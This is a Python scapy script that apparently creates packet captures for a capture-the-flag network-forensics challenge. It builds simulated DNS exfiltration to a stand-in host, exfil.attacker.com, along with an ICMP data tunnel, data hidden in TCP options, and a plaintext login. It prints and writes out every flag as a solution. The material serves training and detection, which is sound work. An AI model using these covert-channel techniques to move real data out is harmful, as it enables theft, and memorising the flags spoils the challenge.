#!/usr/bin/env python3
"""
Packet Analysis Challenge Creator
Creates a PCAP file with hidden flag in network traffic
"""

from scapy.all import *
import base64

def create_challenge_pcap():
    """Create a PCAP with flag hidden in various protocols"""

    packets = []

    # Part 1: HTTP traffic with credentials
    # Simulated HTTP POST to login
    http_payload = (
        "POST /login HTTP/1.1\r\n"
        "Host: secretserver.ctf.local\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 35\r\n"
        "\r\n"
        "username=admin&password=s3cr3t!"
    )

    tcp_pkt = TCP(sport=54321, dport=80, flags='PA', seq=1000, ack=1000)
    ip_pkt = IP(src="192.168.1.100", dst="10.0.0.1")
    http_pkt = ip_pkt / tcp_pkt / Raw(load=http_payload.encode())
    packets.append(http_pkt)

    # Part 2: DNS exfiltration - flag hidden in DNS queries
    # Flag: CTF{dns_3xf1ltr4t10n_d3t3ct3d}
    flag_dns = "CTF{dns_3xf1ltr4t10n_d3t3ct3d}"
    encoded = base64.b32encode(flag_dns.encode()).decode().lower()

    # Split into DNS labels (max 63 chars per label)
    chunk_size = 20
    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i+chunk_size]
        domain = f"{chunk}.exfil.attacker.com"

        dns_pkt = IP(src="192.168.1.100", dst="8.8.8.8") / \
                  UDP(sport=12345, dport=53) / \
                  DNS(rd=1, qd=DNSQR(qname=domain, qtype='TXT'))
        packets.append(dns_pkt)

    # Part 3: ICMP tunnel with data in payload
    # Flag: CTF{1cmp_tunn3l_h1dd3n_d4t4}
    flag_icmp = "CTF{1cmp_tunn3l_h1dd3n_d4t4}"

    icmp_pkt = IP(src="192.168.1.100", dst="10.0.0.1") / \
               ICMP(type=8, code=0, id=1234, seq=1) / \
               Raw(load=b'\x00' * 8 + flag_icmp.encode())
    packets.append(icmp_pkt)

    # Part 4: Normal traffic (noise)
    # Some regular DNS queries
    for domain in ["google.com", "github.com", "stackoverflow.com"]:
        dns_normal = IP(src="192.168.1.100", dst="8.8.8.8") / \
                     UDP(sport=12345, dport=53) / \
                     DNS(rd=1, qd=DNSQR(qname=domain))
        packets.append(dns_normal)

    # Part 5: TCP with encoded data in TCP options
    # Flag: CTF{tcp_0pt10ns_h1d3_d4t4}
    flag_tcp = "CTF{tcp_0pt10ns_h1d3_d4t4}"
    encoded_flag = base64.b64encode(flag_tcp.encode())

    # Use a custom TCP option (not standard, but visible in analysis)
    tcp_with_flag = IP(src="192.168.1.100", dst="10.0.0.1") / \
                    TCP(sport=54322, dport=4444, flags='S',
                        options=[('Timestamp', (12345, 0)),
                                 (253, encoded_flag)])  # Experimental option
    packets.append(tcp_with_flag)

    # Write to file
    wrpcap('challenge_traffic.pcap', packets)
    print(f"[+] Created challenge_traffic.pcap with {len(packets)} packets")
    print("\nHidden flags:")
    print(f"  1. DNS exfiltration: {flag_dns}")
    print(f"  2. ICMP payload: {flag_icmp}")
    print(f"  3. TCP options: {flag_tcp}")

def create_simple_pcap():
    """Create a simpler PCAP for the write-up example"""
    packets = []

    # Simple HTTP GET with hidden comment
    http_get = (
        "GET /index.html HTTP/1.1\r\n"
        "Host: www.example.com\r\n"
        "User-Agent: SecretBrowser/1.0\r\n"
        "X-Flag: CTF{h77p_h34d3r_s3cr3t}\r\n"
        "\r\n"
    )

    pkt = Ether()/IP(src="192.168.1.5", dst="93.184.216.34")/ \
          TCP(sport=54321, dport=80, flags='PA')/ \
          Raw(load=http_get.encode())
    packets.append(pkt)

    # DNS with flag subdomain
    dns_pkt = Ether()/IP(src="192.168.1.5", dst="8.8.8.8")/ \
              UDP(sport=12345, dport=53)/ \
              DNS(rd=1, qd=DNSQR(qname="CTF-dns-3xf1l-secr3t.attacker.com"))
    packets.append(dns_pkt)

    wrpcap('simple_traffic.pcap', packets)
    print("[+] Created simple_traffic.pcap")

if __name__ == '__main__':
    print("Packet Analysis Challenge Creator")
    print("=" * 50)

    try:
        create_challenge_pcap()
    except ImportError:
        print("[-] scapy not installed, creating description file instead")

        # Create a description of what the PCAP would contain
        with open('challenge_description.txt', 'w') as f:
            f.write("""Packet Analysis Challenge Description
======================================

This challenge would create a PCAP file with the following hidden data:

1. HTTP Traffic (Port 80)
   - POST request to /login with credentials
   - Look for: username=admin&password=s3cr3t!

2. DNS Exfiltration (Port 53)
   - Base32 encoded data in subdomain names
   - Look for: queries to *.exfil.attacker.com
   - Decode the subdomain to reveal: CTF{{dns_3xf1ltr4t10n_d3t3ct3d}}

3. ICMP Echo Request (Type 8)
   - Data hidden in ICMP payload after standard header
   - Look for: unusually large ICMP payloads
   - Hidden data: CTF{{1cmp_tunn3l_h1dd3n_d4t4}}

4. TCP Options
   - Flag hidden in experimental TCP option (kind 253)
   - Look for: unusual TCP options
   - Hidden data (base64): CTF{{tcp_0pt10ns_h1d3_d4t4}}

5. Noise Traffic
   - Normal DNS queries to google.com, github.com, etc.
   - Regular HTTP traffic

To solve:
1. Use Wireshark or tshark to analyze
2. Apply filters: dns, icmp, http
3. Look for anomalies in each protocol
4. Extract and decode hidden data
""")

    print("\nTo create actual PCAP, install scapy:")
    print("  pip install scapy")
